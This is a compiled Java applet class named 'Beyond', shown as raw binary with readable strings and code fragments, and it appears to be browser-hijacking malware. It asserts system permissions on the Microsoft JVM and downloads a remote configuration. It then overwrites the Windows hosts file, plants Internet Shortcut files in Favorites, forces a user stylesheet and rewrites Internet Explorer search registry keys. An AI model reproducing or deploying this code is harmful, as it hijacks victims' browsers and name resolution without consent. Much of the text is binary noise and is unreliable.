����  - �  Beyond  java/lang/Object RunIt (Ljava/lang/String;)V Code LineNumberTable 
     Lcom/ms/security/PermissionID; SYSTEM	    com/ms/security/PermissionID   !(Lcom/ms/security/PermissionID;)V assertPermission
    com/ms/security/PolicyEngine  os.name   &(Ljava/lang/String;)Ljava/lang/String; getProperty
    java/lang/System !   ()Ljava/lang/String; toLowerCase
 #  $ java/lang/String & 	user.home ) ( ()I length
 # ' - , (II)Ljava/lang/String; 	substring
 # + 0 windows 3 2 (Ljava/lang/String;)Z 
startsWith
 # 1 6 java/net/URL 8  <init>
 5 7 < ; ()Ljava/io/InputStream; 
openStream
 5 : ? java/lang/StringBuffer 8 A ()V
 > @ E D (C)Ljava/lang/StringBuffer; append
 > C H ( read
 J G K java/io/InputStream M A close
 J L 8 P (Ljava/lang/StringBuffer;)V
 # O S java/util/StringTokenizer U 
 8 W '(Ljava/lang/String;Ljava/lang/String;)V
 R V Z   	nextToken
 R Y ]   trim
 # \ ` NOCSSURL b CSSURL E d ,(Ljava/lang/String;)Ljava/lang/StringBuffer;
 > c g   toString
 > f j FAVURL l HOSTSURL n 	SEARCHURL q p ()Z hasMoreTokens
 R o t +Software\Microsoft\Internet Explorer\Search v @Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders x com/ms/lang/RegKey 8 z (ILjava/lang/String;I)V
 w y } 	Favorites   getStringValue
 w ~ � java/lang/Throwable � | � %WinDir% � � (Ljava/lang/String;)I indexOf
 # � - � (I)Ljava/lang/String;
 # � � [InternetShortcut]
URL= � 
Modified=806188A46609C1013E � 
IconFile= � 
IconIndex= � \ � .url � W 	WriteFile
  � � +Software\Microsoft\Internet Explorer\Styles � Use My Stylesheet � � (Ljava/lang/String;I)V setValue
 w � � User Stylesheet � \my.css � W
 w � � java/io/File � \hosts
 � 7 � \system32\drivers\etc\hosts � java/io/FileOutputStream
 � 7 � � ()[B getBytes
 # � � � ([B)V write
 � �
 � L � +SOFTWARE\Microsoft\Internet Explorer\Search � )SOFTWARE\Microsoft\Internet Explorer\Main � 
Search Bar � 2.DEFAULT\Software\Microsoft\Internet Explorer\Main 
Exceptions � java/lang/Exception@    � � <(Ljava/lang/String;IILcom/ms/win32/SECURITY_ATTRIBUTES;III)I 
CreateFile
 � � � com/ms/win32/Kernel32 � � 2(ILjava/lang/Object;I[ILcom/ms/win32/OVERLAPPED;)Z
 � � � � (I)Z CloseHandle
 � �
  @ Beyond.java 
SourceFile !              )    9	M	N	:	:6� � � � ":%� � ":� *d� .:	/� 4�� 5Y+� 9:

� =:� >Y� B:6� 3�� 
6� 

� �� FW�
� � 6� IY6���� N� #Y� Q:� RYT� X:� �� [� ^:_� 4� 6a� 4� &� >Y� B-� e� *� .� e
� F� hNi� 4� &� >Y� B,� e� *� .� e
� F� hMk� 4� (� >Y� B� e	� *� .� e
� F� h:m� 4� 
� *� .:� r��Cs:u:	:� wY� {:|� �:� :,� *� �	:	:� RY,T� X:� �� [� ^:� RY�� X:� [:� [:� [:�� �� &� >Y� B	� e�� �`� �� e� h:� 	:	:� [:� 	:	:� >Y� B�� e� e�� e�� e� e�� e� e� h:*� >Y� B� e�� e� e�� e� h� �� :� r��0-� *� L� wY�� {:�� ��� >Y� B	� e�� e� h� �*� >Y� B	� e�� e� h-� �Y6� ;� wY�� {:�� ��	� �*� >Y� B	� e�� e� h	� �� *d� .:� �Y� >Y� B� e�� e� h� �:� �Y� >Y� B� e�� e� h� �:� *� e� �Y� >Y� B� e�� e� h� �:� �� �� �� :� �Y� >Y� B� e�� e� h� �:� �� �� �� :� *� T� wY�� {:	� �� :� wY�� {:�� �� :� wY�� {:�� �� :� :� 
��� ��" �(/2 �8�� �x�� ���� ���� �� �.1 � 36 �    � c        
          !  +  :  D   N " U $ ^ % ^ & ^ & d ' l ( p ) | * � & � & � , � . � / � / � 1 � 3 � 4 � 7 � 8 : ;1 =; >` @j Ax /� E� F� G� H� I� J� M� N� O� P� P� R� S� T� U� V� W� X� Y$ [( \( ]4 ^8 `8 ag c� P� h� i� j� k� l� o� p� q r s' v6 wS xp zx {x |� }� ~� �� �� �� �� �� �� �� �� �� �
 � � �% �8 �  � W  �     �    Q     )+� �� �>�
:,� �,� *� �W� �W�           �  �  � # � ( �  8 A     !     *� ױ       
        �    �